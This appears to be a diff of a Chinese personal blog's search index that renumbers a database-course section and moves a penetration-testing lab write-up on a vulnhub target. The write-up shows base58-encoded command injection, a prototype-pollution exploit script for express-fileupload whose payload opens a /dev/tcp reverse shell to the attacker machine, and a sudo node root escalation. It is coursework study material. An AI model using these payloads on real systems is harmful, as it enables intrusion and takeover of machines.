@@ -154,7 +154,21 @@
 
 <img src="https://assets.kekwy.com/images/image-20231231163519882.png" alt="两层和三层体系结构" width=500 />
 
-<h3 id="1-10-数据挖掘与信息检索"><a href="#1-10-数据挖掘与信息检索" class="headerlink" title="1.10 数据挖掘与信息检索"></a>1.10 数据挖掘与信息检索</h3><h3 id="1-11-特种数据库"><a href="#1-11-特种数据库" class="headerlink" title="1.11 特种数据库"></a>1.11 特种数据库</h3><h3 id="1-12-数据库用户和管理员"><a href="#1-12-数据库用户和管理员" class="headerlink" title="1.12 数据库用户和管理员"></a>1.12 数据库用户和管理员</h3><h3 id="1-13-数据库的历史"><a href="#1-13-数据库的历史" class="headerlink" title="1.13 数据库的历史"></a>1.13 数据库的历史</h3>]]></content>
+<h3 id="1-10-数据库用户和管理员"><a href="#1-10-数据库用户和管理员" class="headerlink" title="1.10 数据库用户和管理员"></a>1.10 数据库用户和管理员</h3><h4 id="1-10-1-数据库用户和用户界面"><a href="#1-10-1-数据库用户和用户界面" class="headerlink" title="1.10.1 数据库用户和用户界面"></a>1.10.1 数据库用户和用户界面</h4><ul>
+<li><strong>初学者用户</strong>：缺少经验，使用已有的用户界面与系统交互。</li>
+<li><strong>应用程序员</strong>：计算机专业人员，可以借助工具开发应用界面。</li>
+<li><strong>老练用户</strong>：使用数据库查询语言或数据分析软件与系统交互。</li>
+</ul>
+<h4 id="1-10-2-数据库管理员"><a href="#1-10-2-数据库管理员" class="headerlink" title="1.10.2 数据库管理员"></a>1.10.2 数据库管理员</h4><p><strong>数据库管理员</strong> (DBA)：对系统进行集中控制的人。</p>
+<p>DBA 的作用包括：</p>
+<ul>
+<li>模式定义；</li>
+<li>存储结构及存取方法定义；</li>
+<li>模式及物理组织的修改；</li>
+<li>数据访问授权；</li>
+<li>日常维护。</li>
+</ul>
+]]></content>
       <categories>
         <category>数据库系统概念</category>
       </categories>
@@ -209,7 +223,7 @@
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
 <p>iOS assignment 1: Calculator App.</p>
 <p>姓名：可弟WZ Kekwy</p>
-<p>邮箱：<a href="mailto:&#x6b;&#101;&#101;&#x6b;&#x6b;&#101;&#x77;&#x79;&#64;&#x71;&#x71;&#46;&#x63;&#x6f;&#x6d;">&#x6b;&#101;&#101;&#x6b;&#x6b;&#101;&#x77;&#x79;&#64;&#x71;&#x71;&#46;&#x63;&#x6f;&#x6d;</a></p>
+<p>邮箱：<a href="mailto:&#107;&#101;&#x65;&#107;&#107;&#x65;&#119;&#121;&#64;&#x71;&#113;&#46;&#x63;&#x6f;&#x6d;">&#107;&#101;&#x65;&#107;&#107;&#x65;&#119;&#121;&#64;&#x71;&#113;&#46;&#x63;&#x6f;&#x6d;</a></p>
 </blockquote>
 <p>用 swift &amp; storyboard 实现一个计算器APP（包括科学计算器）。</p>
 <p><strong>项目仓库：</strong><a href="https://github.com/Kekwy/iwork1-Calculator">https://github.com/Kekwy/iwork1-Calculator</a></p>
@@ -411,7 +425,7 @@
     <title>【iOS开发】IW2 新闻APP</title>
     <url>/iw2-newsapp/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
-<p><a href="mailto:&#x6b;&#x65;&#x65;&#x6b;&#107;&#x65;&#x77;&#x79;&#x40;&#113;&#x71;&#46;&#99;&#x6f;&#109;">&#x6b;&#x65;&#x65;&#x6b;&#107;&#x65;&#x77;&#x79;&#x40;&#113;&#x71;&#46;&#99;&#x6f;&#109;</a></p>
+<p><a href="mailto:&#x6b;&#x65;&#x65;&#x6b;&#107;&#x65;&#119;&#x79;&#x40;&#x71;&#x71;&#46;&#x63;&#x6f;&#109;">&#x6b;&#x65;&#x65;&#x6b;&#107;&#x65;&#119;&#x79;&#x40;&#x71;&#x71;&#46;&#x63;&#x6f;&#109;</a></p>
 </blockquote>
 <ul>
 <li><a href="#%E7%AE%80%E4%BB%8B">简介</a><ul>
@@ -1087,6 +1101,218 @@
       </tags>
   </entry>
   <entry>
+    <title>【渗透测试】第五周 vulnhub-</title>
+    <url>/lab5-report/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="网络攻防实战-实验报告"><a href="#网络攻防实战-实验报告" class="headerlink" title="网络攻防实战 实验报告"></a>网络攻防实战 实验报告</h1><blockquote>
+<p>网络攻防实战 第七次实验</p>
+<p>邮箱：<a href="mailto:&#107;&#101;&#x65;&#x6b;&#107;&#101;&#x77;&#121;&#64;&#113;&#113;&#46;&#x63;&#x6f;&#x6d;">&#107;&#101;&#x65;&#x6b;&#107;&#101;&#x77;&#121;&#64;&#113;&#113;&#46;&#x63;&#x6f;&#x6d;</a></p>
+<p>2022年10月19日</p>
+<p>靶机链接：</p>
+</blockquote>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>[TOC]</p>
+<h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><p>获取靶机中的flag，并取得目标靶机的root权限。</p>
+<p>我们将使用到以下攻击手段：</p>
+<ul>
+<li>主机发现、端口扫描</li>
+<li>查看 web 源码</li>
+<li>编&#x2F;解码</li>
+<li>注入命令</li>
+<li>反弹 shell</li>
+<li>代码审计</li>
+<li>搜索漏洞信息</li>
+<li>利用 <code>express-fileupload</code> 的代码漏洞</li>
+<li>本地提权</li>
+</ul>
+<h2 id="二、实验内容"><a href="#二、实验内容" class="headerlink" title="二、实验内容"></a>二、实验内容</h2><blockquote>
+<p>kali: 10.0.2.15</p>
+<p>靶机: 10.0.2.9</p>
+</blockquote>
+<h3 id="0x00-准备工作"><a href="#0x00-准备工作" class="headerlink" title="0x00. 准备工作"></a>0x00. 准备工作</h3><ol>
+<li><p>发现靶机IP并对其进行端口扫描，查看各端口所运行的服务类型：</p>
+<div align=left>
+    <img src="https://assets.kekwy.com/images/image-20221020092811961.png" width=750 />
+</div>
+
+
+<p>发现目标靶机的80端口和8000端口上都运行了一个web应用。</p>
+</li>
+<li><p>首先通过浏览器访问靶机80端口上的 web 应用：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221020093445922.png" width=700 />
+</div>
+
+<p>出现 “Data &amp; Time” 字样，无明显线索。查看源码，发现一段 JavaScript 代码：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221020094049616.png" width=700 />
+</div>
+
+
+<p>使用 <a href="https://gchq.github.io/CyberChef/">CyberChef</a> 的 <code>beautify</code> 功能进行美化：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x5bdf = [</span><br><span class="line">	<span class="string">&#x27;150447srWefj&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;70lwLrol&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;1658165LmcNig&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;open&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;1260881JUqdKM&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;10737CrnEEe&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;2SjTdWC&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;readyState&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;responseText&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;1278676qXleJg&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;797116soVTES&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;onreadystatechange&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;User-Agent&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;status&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;1DYOODT&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;400909Mbbcfr&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;Chronos&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;2QRBPWS&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;getElementById&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;innerHTML&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;date&#x27;</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure>
+
+<p>发现其中包含对 <code>chronos.local</code> 的访问，尝试在 kali 上将其与靶机的IP地址绑定。</p>
+</li>
+<li><p>修改 <code>/etc/hosts</code> ，加入如下内容：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221020095325946.png" width=500 />
+</div>
+
+
+<p>再次访问靶机 80 端口，发现出现了日期时间等字样：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221021135006594.png" width=700 />
+</div></li>
+</ol>
+<h3 id="0x01-指令注入漏洞"><a href="#0x01-指令注入漏洞" class="headerlink" title="0x01. 指令注入漏洞"></a>0x01. 指令注入漏洞</h3><ol>
+<li><p>再次查看网页源码发现一段疑似 base58 编码的字符串：</p>
+<p><code>http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</code></p>
+<p>使用 <a href="https://gchq.github.io/CyberChef/">CyberChef</a> 解码：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221021135323274.png" width=750 />
+</div>
+
+
+<p>得到 <code>&#39;+Today is %A, %B %d, %Y %H:%M:%S.&#39;</code>，推测此处存在指令注入漏洞。</p>
+</li>
+<li><p>再次访问靶机 80 端口，并通过 <code>Burp Suite</code> 拦截对访问 8000 端口时的数据包，并将其发送至 <code>Repeater</code>：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221021135647863.png" width=600 />
+</div>
+
+
+<p>尝试将我们想要执行的指令，通过 <code>&amp;&amp; [$cmd]</code> 的形式添加在 <code>format=</code> 之后（[$cmd] 是目标指令内容）。但是需要注意的是，我们的注入内容同样需要经过 base58 编码。</p>
+<p>使用 <a href="https://gchq.github.io/CyberChef/">CyberChef</a> 对我们欲注入的内容进行编码，首先尝试执行 ls 指令：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221021140051546.png" width=700 />
+</div>
+</li>
+<li><p>在 Repeater 中修改数据包：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221021140158305.png" width=400 />
+</div>
+
+
+<p>点击发送，查看返回结果，发现返回了某路径下的内容，确认其存在指令注入漏洞：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221021140345158.png" width=400 />
+</div>
+</li>
+<li><p>接下来我们将尝试以此作为突破口生成反弹 shell。</p>
+</li>
+</ol>
+<h3 id="0x02-生成反弹-shell"><a href="#0x02-生成反弹-shell" class="headerlink" title="0x02. 生成反弹 shell"></a>0x02. 生成反弹 shell</h3><ol>
+<li><p>利用上述指令出入漏洞查看靶机 <code>/usr/bin</code> 下的文件，注入步骤同上：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221021140646383.png" width=350 />
+</div>
+
+
+<p>发现存在 python 环境，故尝试利用此前多次使用的 python 反弹 shell 代码生成反弹 shell。</p>
+</li>
+<li><p>在 kali 监听 4444 端口，将反弹 shell 命令编码后注入：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221021141046767.png" width=550 />
+</div>
+
+
+<p>成功获取到来自靶机的反弹 shell。</p>
+</li>
+<li><p>通过一下命令进行提升：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221021141422079.png" width=550 />
+</div></li>
+</ol>
+<h3 id="0x03-node-js-express-fileupload-漏洞"><a href="#0x03-node-js-express-fileupload-漏洞" class="headerlink" title="0x03. node.js express-fileupload 漏洞"></a>0x03. node.js express-fileupload 漏洞</h3><ol>
+<li><p>通过简单的信息收集，我们在 <code>/opt/chronos-v2/backend</code> 路径下找到了与 <code>node.js</code> 服务相关的文件 <code>server.js</code>：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221021142250813.png" width=550 />
+</div>
+
+
+<p>查看其内容：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fileupload = <span class="built_in">require</span>(<span class="string">&quot;express-fileupload&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">fileupload</span>(&#123; <span class="attr">parseNested</span>: <span class="literal">true</span> &#125;));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, <span class="string">&quot;/opt/chronos-v2/frontend/pages&quot;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">   res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = http.<span class="title class_">Server</span>(app);</span><br><span class="line"><span class="keyword">const</span> addr = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">server.<span class="title function_">listen</span>(port, addr, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server listening on &#x27;</span> + addr + <span class="string">&#x27; port &#x27;</span> + port);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>发现该代码在运行时会在本地 IP 的 8080 端口上运行一个 web 服务器。同时还发现该应用加载了 <code>express-fileupload</code> 库。通过搜索，发现若设置了 <code>app.use(fileupload(&#123; parseNested: true &#125;));</code> ，则存在可以用的漏洞。再次查看上述代码，发现恰好启用了该服务。</p>
+</li>
+<li><p>继续搜索有关内容，最终在一篇<a href="https://blog.p6.is/Real-World-JS-1/">博客文章</a>中找到可用的漏洞利用代码，并根据实验环境进行修改：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10.0.2.15 为靶机的IP</span></span><br><span class="line"><span class="comment"># 5555 为靶机监听的端口</span></span><br><span class="line">cmd = <span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/10.0.2.15/5555 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># http://127.0.0.1:8080 为本次实验中目标服务的访问地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">requests.post(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;);x&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">requests.get(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>先将该段代码写入位于 kali 的某一文件中，再通过之前实验中的方式，利用在 kali 上启动 web 服务的方式将该文件上传至靶机（通过之前的步骤我们得知靶机中存在 python 环境）</p>
+<p><a id="要链接！！！"></a></p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221021144921540.png" width=350 />
+</div>
+</li>
+<li><p>执行：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python3 code.py</span><br></pre></td></tr></table></figure>
+
+<p>获取到另一个用户身份的反弹shell：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/@IFF6W$S]HAT[XN09[_}XU.png" width=700 />
+</div></li>
+</ol>
+<h3 id="0x04-第一个-Flag"><a href="#0x04-第一个-Flag" class="headerlink" title="0x04. 第一个 Flag"></a>0x04. 第一个 Flag</h3><ol>
+<li><p>切换至当前用户的主目录 <code>/home/imera</code>，发现文件 <code>user.txt</code>。查看内容：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221021151014936.png" width=400 />
+</div>
+</li>
+<li><p>使用 base58 解码后，得到：</p>
+<p><code>Char &#39;I&#39; at position 12 not in alphabet</code></p>
+</li>
+</ol>
+<h3 id="0x05-利用-node-命令提权"><a href="#0x05-利用-node-命令提权" class="headerlink" title="0x05. 利用 node 命令提权"></a>0x05. 利用 node 命令提权</h3><ol>
+<li><p>查看当前用户可以通过 <code>sudo</code> 执行的命令：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221021151621621.png" width=700 />
+</div>
+
+
+<p>发现存在两个命令可以不提供密码直接使用 <code>sudo</code> 执行。</p>
+</li>
+<li><p>输入以下命令：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo node -e <span class="string">&#x27;child_process.spawn(&quot;/bin/bash&quot;,&#123;stdio:[0,1,2]&#125;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>生成一个拥有 root 权限的 shell 进行提权：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221021151917440.png" width=700 />
+</div></li>
+</ol>
+<h2 id="三、实验结果"><a href="#三、实验结果" class="headerlink" title="三、实验结果"></a>三、实验结果</h2><p>Flag1：<code>Char &#39;I&#39; at position 12 not in alphabet</code></p>
+<p>root 提权：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221021151917440.png" width=700 />
+</div>
+
+
+
+
+<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><ul>
+<li>访问靶机80端口，查看源码发现存在对域名地址 <code>chronos.local</code> 的访问；</li>
+<li>修改 kali 的 <code>/etc/hosts</code> 文件，将上述域名与靶机 IP 绑定；</li>
+<li>利用  <a href="https://gchq.github.io/CyberChef/">CyberChef</a> 进行数据的编解码；</li>
+<li>拦截访问靶机80端口时，向 <code>http://chronos.local:8000</code> 发送的数据包，利用命令注入漏洞注入编码后的反弹 shell 指令；</li>
+<li>利用反弹 shell 进行信息收集，对文件  <code>/opt/chronos-v2/backend/server.js</code> 进行代码审计，发现隐藏的本地服务器；</li>
+<li>上网搜索相关的漏洞信息，发现漏洞利用代码；</li>
+<li>将代码文件上传至靶机并执行，得到另一个用户身份的反弹 shell；</li>
+<li>利用 node 命令进行本地提权。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>网络攻防实战</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+        <tag>Kali</tag>
+        <tag>网络</tag>
+        <tag>安全</tag>
+        <tag>Linux</tag>
+        <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>服务端开发 课程总结 复习大纲</title>
     <url>/se-serverdev/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="服务端开发-复习大纲"><a href="#服务端开发-复习大纲" class="headerlink" title="服务端开发 复习大纲"></a>服务端开发 复习大纲</h1><h2 id="一、建立开发环境"><a href="#一、建立开发环境" class="headerlink" title="一、建立开发环境"></a>一、建立开发环境</h2><blockquote>
@@ -1676,7 +1902,7 @@
     <url>/vulnhub-Cereal/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
 <p>网络攻防实战 第十次实验</p>
-<p>邮箱：<a href="mailto:&#x6b;&#x65;&#101;&#107;&#x6b;&#101;&#119;&#121;&#x40;&#x71;&#113;&#46;&#x63;&#111;&#109;">&#x6b;&#x65;&#101;&#107;&#x6b;&#101;&#119;&#121;&#x40;&#x71;&#113;&#46;&#x63;&#111;&#109;</a></p>
+<p>邮箱：<a href="mailto:&#107;&#x65;&#101;&#107;&#107;&#x65;&#119;&#121;&#x40;&#x71;&#x71;&#46;&#x63;&#x6f;&#109;">&#107;&#x65;&#101;&#107;&#107;&#x65;&#119;&#121;&#x40;&#x71;&#x71;&#46;&#x63;&#x6f;&#109;</a></p>
 <p>2022年11月26日</p>
 <p>靶机链接：<a href="https://vulnhub.com/entry/cereal-1,703/">https://vulnhub.com/entry/cereal-1,703/</a></p>
 </blockquote>
@@ -1937,7 +2163,7 @@
     <url>/vulnhub-EvilBoxOne/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
 <p>网络攻防实战 第八次实验</p>
-<p>邮箱：<a href="mailto:&#107;&#101;&#x65;&#x6b;&#107;&#x65;&#119;&#x79;&#x40;&#x71;&#113;&#46;&#99;&#x6f;&#109;">&#107;&#101;&#x65;&#x6b;&#107;&#x65;&#119;&#x79;&#x40;&#x71;&#113;&#46;&#99;&#x6f;&#109;</a></p>
+<p>邮箱：<a href="mailto:&#107;&#x65;&#101;&#x6b;&#x6b;&#x65;&#x77;&#121;&#64;&#x71;&#x71;&#x2e;&#x63;&#x6f;&#109;">&#107;&#x65;&#101;&#x6b;&#x6b;&#x65;&#x77;&#121;&#64;&#x71;&#x71;&#x2e;&#x63;&#x6f;&#109;</a></p>
 <p>2022年11月8日</p>
 <p>靶机链接：<a href="https://vulnhub.com/entry/evilbox-one,736/">https://vulnhub.com/entry/evilbox-one,736/</a></p>
 </blockquote>
@@ -2185,223 +2411,11 @@
       </tags>
   </entry>
   <entry>
-    <title>【渗透测试】第五周 vulnhub-</title>
-    <url>/lab5-report/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="网络攻防实战-实验报告"><a href="#网络攻防实战-实验报告" class="headerlink" title="网络攻防实战 实验报告"></a>网络攻防实战 实验报告</h1><blockquote>
-<p>网络攻防实战 第七次实验</p>
-<p>邮箱：<a href="mailto:&#x6b;&#x65;&#x65;&#x6b;&#x6b;&#101;&#119;&#x79;&#x40;&#x71;&#113;&#46;&#x63;&#x6f;&#109;">&#x6b;&#x65;&#x65;&#x6b;&#x6b;&#101;&#119;&#x79;&#x40;&#x71;&#113;&#46;&#x63;&#x6f;&#109;</a></p>
-<p>2022年10月19日</p>
-<p>靶机链接：</p>
-</blockquote>
-<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>[TOC]</p>
-<h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><p>获取靶机中的flag，并取得目标靶机的root权限。</p>
-<p>我们将使用到以下攻击手段：</p>
-<ul>
-<li>主机发现、端口扫描</li>
-<li>查看 web 源码</li>
-<li>编&#x2F;解码</li>
-<li>注入命令</li>
-<li>反弹 shell</li>
-<li>代码审计</li>
-<li>搜索漏洞信息</li>
-<li>利用 <code>express-fileupload</code> 的代码漏洞</li>
-<li>本地提权</li>
-</ul>
-<h2 id="二、实验内容"><a href="#二、实验内容" class="headerlink" title="二、实验内容"></a>二、实验内容</h2><blockquote>
-<p>kali: 10.0.2.15</p>
-<p>靶机: 10.0.2.9</p>
-</blockquote>
-<h3 id="0x00-准备工作"><a href="#0x00-准备工作" class="headerlink" title="0x00. 准备工作"></a>0x00. 准备工作</h3><ol>
-<li><p>发现靶机IP并对其进行端口扫描，查看各端口所运行的服务类型：</p>
-<div align=left>
-    <img src="https://assets.kekwy.com/images/image-20221020092811961.png" width=750 />
-</div>
-
-
-<p>发现目标靶机的80端口和8000端口上都运行了一个web应用。</p>
-</li>
-<li><p>首先通过浏览器访问靶机80端口上的 web 应用：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221020093445922.png" width=700 />
-</div>
-
-<p>出现 “Data &amp; Time” 字样，无明显线索。查看源码，发现一段 JavaScript 代码：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221020094049616.png" width=700 />
-</div>
-
-
-<p>使用 <a href="https://gchq.github.io/CyberChef/">CyberChef</a> 的 <code>beautify</code> 功能进行美化：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x5bdf = [</span><br><span class="line">	<span class="string">&#x27;150447srWefj&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;70lwLrol&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;1658165LmcNig&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;open&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;1260881JUqdKM&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;10737CrnEEe&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;2SjTdWC&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;readyState&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;responseText&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;1278676qXleJg&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;797116soVTES&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;onreadystatechange&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;User-Agent&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;status&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;1DYOODT&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;400909Mbbcfr&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;Chronos&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;2QRBPWS&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;getElementById&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;innerHTML&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;date&#x27;</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure>
-
-<p>发现其中包含对 <code>chronos.local</code> 的访问，尝试在 kali 上将其与靶机的IP地址绑定。</p>
-</li>
-<li><p>修改 <code>/etc/hosts</code> ，加入如下内容：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221020095325946.png" width=500 />
-</div>
-
-
-<p>再次访问靶机 80 端口，发现出现了日期时间等字样：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221021135006594.png" width=700 />
-</div></li>
-</ol>
-<h3 id="0x01-指令注入漏洞"><a href="#0x01-指令注入漏洞" class="headerlink" title="0x01. 指令注入漏洞"></a>0x01. 指令注入漏洞</h3><ol>
-<li><p>再次查看网页源码发现一段疑似 base58 编码的字符串：</p>
-<p><code>http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</code></p>
-<p>使用 <a href="https://gchq.github.io/CyberChef/">CyberChef</a> 解码：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221021135323274.png" width=750 />
-</div>
-
-
-<p>得到 <code>&#39;+Today is %A, %B %d, %Y %H:%M:%S.&#39;</code>，推测此处存在指令注入漏洞。</p>
-</li>
-<li><p>再次访问靶机 80 端口，并通过 <code>Burp Suite</code> 拦截对访问 8000 端口时的数据包，并将其发送至 <code>Repeater</code>：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221021135647863.png" width=600 />
-</div>
-
-
-<p>尝试将我们想要执行的指令，通过 <code>&amp;&amp; [$cmd]</code> 的形式添加在 <code>format=</code> 之后（[$cmd] 是目标指令内容）。但是需要注意的是，我们的注入内容同样需要经过 base58 编码。</p>
-<p>使用 <a href="https://gchq.github.io/CyberChef/">CyberChef</a> 对我们欲注入的内容进行编码，首先尝试执行 ls 指令：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221021140051546.png" width=700 />
-</div>
-</li>
-<li><p>在 Repeater 中修改数据包：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221021140158305.png" width=400 />
-</div>
-
-
-<p>点击发送，查看返回结果，发现返回了某路径下的内容，确认其存在指令注入漏洞：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221021140345158.png" width=400 />
-</div>
-</li>
-<li><p>接下来我们将尝试以此作为突破口生成反弹 shell。</p>
-</li>
-</ol>
